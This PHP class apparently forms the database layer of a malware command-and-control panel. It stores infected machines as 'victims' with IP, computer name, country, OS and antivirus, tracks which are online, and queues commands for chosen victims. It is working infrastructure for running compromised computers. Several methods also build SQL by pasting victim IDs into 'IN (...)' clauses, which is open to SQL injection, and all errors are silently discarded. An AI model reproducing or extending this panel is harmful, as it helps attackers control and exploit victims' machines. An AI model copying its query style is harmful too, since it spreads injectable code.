<?php 

class Clients extends Database{
	public function newClient($vicID,$ipadress,$computername,$country,$os,$date,$antivirus,$status){
		try {
			$pdo = $this->Connect();
			$sql = "INSERT INTO clients(vicid,ipaddress,computername,country,os,insdate,antivirus,status) VALUES(:vicid,:ip,:cpname,:cont,:os,:insdate,:av,:stats)";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['vicid'=>$vicID,'ip'=>$ipadress,'cpname'=>$computername,'cont'=>$country,'os'=>$os,'insdate'=>$date,'av'=>$antivirus,'stats'=>$status]);
			$this->createCommand($vicID);
			return 'Client Created';
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function removeClient($clientID){
		try {
			$pdo = $this->Connect();
			$sql = "DELETE FROM clients WHERE vicid IN ($clientID)";
			$stmt = $pdo->prepare($sql);
			$stmt->execute();
			return 'Client Removed';
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function removeAllClients($clientID){
		try {
			$pdo = $this->Connect();
			$sql = "TRUNCATE TABLE clients";
			$stmt = $pdo->prepare($sql);
			$stmt->execute([$clientID]);
			return 'Client Removed';
		} catch (\Throwable $th) {
			//throw $th;
		}
	
	}

	public function updateClient($vicID,$ipadress,$computername,$country,$os,$date,$antivirus,$status){
		try {
			$pdo = $this->Connect();
			$sql = "UPDATE clients SET
			vicid = :vicid,
			ipaddress = :ip,
			computername = :cpname,
			country = :cont,
			os = :os,
			insdate = :insdate,
			antivirus = :av,
			status = :stats WHERE vicid = :vicid";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['vicid'=>$vicID,'ip'=>$ipadress,'cpname'=>$computername,'cont'=>$country,'os'=>$os,'insdate'=>$date,'av'=>$antivirus,'stats'=>$status]);
			return 'Client Updated';
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function isExist($clientID,$table_name){
		try {
			$pdo = $this->Connect();
			$sql = $pdo->prepare("SELECT * FROM " . $table_name . " WHERE vicid = :id");
			$sql->execute(['id'=>$clientID]);
			if ($sql->rowCount()) {
				return true;
			} else {
				return false;
			}
		} catch (\Throwable $th) {
			//throw $th;
		}

	}

	public function getClients(){
		try {
			$pdo = $this->Connect();
			$sql = "SELECT * FROM clients";
			$stmt = $pdo->prepare($sql);
			$stmt->execute();
			$data = $stmt->fetchAll();
			return $data;
		} catch (\Throwable $th) {
			//throw $th;
		}
	}


	public function countClients(){
		try {
			$pdo = $this->Connect();
			$sql = "SELECT COUNT(*) FROM clients";
			$stmt = $pdo->prepare($sql);
			$stmt->execute();
			$data = $stmt->fetchColumn();
			return $data;
		} catch (\Throwable $th) {
			//throw $th;
		}
	}


	public function getClient($vicID){
		try {
			$pdo = $this->Connect();
			$sql = "SELECT * FROM clients WHERE vicid = :id";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['id' => $vicID]);
			$data = $stmt->fetch();
			return $data;
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function countClientByOs($condtion){
		try {
			$pdo = $this->Connect();
			$sql = "SELECT COUNT(*) FROM clients WHERE os LIKE ?";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(["%".$condtion."%"]);
			$data = $stmt->fetchColumn();
			return $data;
		} catch (\Throwable $th) {
		//throw $th;
		}
	}

	public function countOnlineClients(){
		try {
			$pdo = $this->Connect();
			$sql = "SELECT COUNT(*) FROM clients WHERE status = :status";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['status' => 'online']);
			$data = $stmt->fetchColumn();
			return $data;
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function updateStatus($vicID,$status){
		try {
			$pdo = $this->Connect();
			$sql = "UPDATE clients SET status = :stats WHERE vicid IN ($vicID)";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['stats'=>$status]);
			return 'Updated';
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function getCommand($vicID){
		try {
			$pdo = $this->Connect();
			$sql = "SELECT * FROM commands WHERE vicid = :id";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['id' => $vicID]);
			$data = $stmt->fetch();
			return $data;
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function updateAllStatus($status){
		try {
			$pdo = $this->Connect();
			$sql = "UPDATE clients SET status = :stats";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['stats'=>$status]);
			return 'Updated';
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function createCommand($vicID){
		try {
			if ($this->isExist($vicID,"commands")) {
			
			} else {
				$pdo = $this->Connect();
				$sql = "INSERT INTO commands(vicid,command) VALUES(:vicid,:cmd)";
				$stmt = $pdo->prepare($sql);
				$stmt->execute(['vicid'=>$vicID,'cmd'=>"Ping"]);	
			}
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function updateCommands($vicID,$command){
		try {
			$pdo = $this->Connect();
			$sql = "UPDATE commands SET command = :cmd WHERE vicid IN ($vicID)";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['cmd'=>$command]);	
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function removeCommands($vicID){
		try {
			$pdo = $this->Connect();
			$sql = "DELETE FROM commands WHERE vicid IN ($vicID)";
			$stmt = $pdo->prepare($sql);
			$stmt->execute();
			return 'Client Removed';
		} catch (\Throwable $th) {
			//throw $th;
		}
	}


	public function countClientByCountry($code){
		$pdo = $this->Connect();
		$sql = "SELECT COUNT(*) FROM clients WHERE country = ?";
		$stmt = $pdo->prepare($sql);
		$stmt->execute([$code]);
		$data = $stmt->fetchColumn();
		return $data;
	}
}
?>